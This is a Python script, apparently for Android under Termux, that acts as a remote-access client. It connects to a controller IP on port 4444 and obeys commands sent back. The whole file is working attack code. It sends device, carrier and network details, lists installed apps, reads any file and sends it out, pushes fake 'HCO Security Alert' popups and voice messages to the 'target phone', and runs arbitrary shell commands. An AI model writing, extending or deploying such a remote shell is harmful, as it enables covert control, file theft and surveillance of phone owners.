import socket
import subprocess

def run_client():
    print("""
    =========================================
       HCO ADVANCED CLIENT (v5.0 ACTIVE)   
    =========================================
    """)
    server_ip = input("[?] Enter Server IP (e.g., 192.168.1.10): ").strip()
    port = 4444
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, port))
        print("[+] Connection Established with Controller Node!")
    except Exception as e:
        print(f"[-] Connection Failed: {e}")
        return
    
    while True:
        try:
            data = client.recv(4096).decode()
            if not data or data == 'exit':
                break
            
            # 1. Deep Hardware, Brand, RAM, Operator & Network Info
            if data == 'sysinfo':
                cmd = """
                echo '----------------------------------------'
                echo '[+] HARDWARE & DEVICE BRAND DETAILS'
                echo '----------------------------------------'
                echo -n 'Device Brand  : '; getprop ro.product.brand
                echo -n 'Device Model  : '; getprop ro.product.model
                echo -n 'Device Name   : '; getprop ro.product.device
                echo -n 'Android Ver   : '; getprop ro.build.version.release
                echo -n 'Processor Arch: '; uname -m
                
                echo '\n----------------------------------------'
                echo '[+] MEMORY & RAM STATUS'
                echo '----------------------------------------'
                free -h 2>/dev/null || cat /proc/meminfo | grep MemTotal
                
                echo '\n----------------------------------------'
                echo '[+] NETWORK & OPERATOR INTERFACES'
                echo '----------------------------------------'
                ifconfig 2>/dev/null || ip addr
                
                echo '\n----------------------------------------'
                echo '[+] ACTIVE TELEPHONY / SIM CARRIER'
                echo '----------------------------------------'
                getprop gsm.operator.alpha 2>/dev/null || echo 'Carrier info restricted/unavailable'
                getprop gsm.network.type 2>/dev/null
                echo '----------------------------------------'
                """
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 2. Voice Alert
            elif data.startswith('alert:'):
                msg = data.split('alert:')[1]
                subprocess.Popen(f"termux-tts-speak '{msg}'", shell=True)
                output = b"Voice alert successfully executed on target phone speaker!"
                
            # 3. File Downloader
            elif data.startswith('download:'):
                file_path = data.split('download:')[1]
                try:
                    with open(file_path, 'rb') as f:
                        output = f.read()
                except Exception as file_err:
                    output = f"File Read Error: {str(file_err)}".encode()
                    
            # 4. Push Popup Notification
            elif data.startswith('popup:'):
                note_content = data.split('popup:')[1]
                notif_cmd = f"termux-notification --title 'HCO Security Alert' --content '{note_content}'"
                subprocess.Popen(notif_cmd, shell=True)
                output = b"Popup notification successfully pushed to target screen!"
                
            # 5. List Installed Apps
            elif data == 'apps':
                app_cmd = "pm list packages -f 2>/dev/null"
                output = subprocess.check_output(app_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 6. Battery & Storage Health
            elif data == 'battery':
                batt_cmd = "termux-battery-status 2>/dev/null || echo 'Battery API query skipped'; echo '\n[DISK STORAGE USAGE]'; df -h"
                output = subprocess.check_output(batt_cmd, shell=True, stderr=subprocess.STDOUT)
                
            # 7. Custom Shell Command
            elif data.startswith('cmd:'):
                real_cmd = data.split('cmd:')[1]
                output = subprocess.check_output(real_cmd, shell=True, stderr=subprocess.STDOUT)
            else:
                output = b"Unknown payload command."
                
        except Exception as e:
            output = str(e).encode()
            
        client.send(output)
        
    client.close()

if __name__ == "__main__":
    run_client()
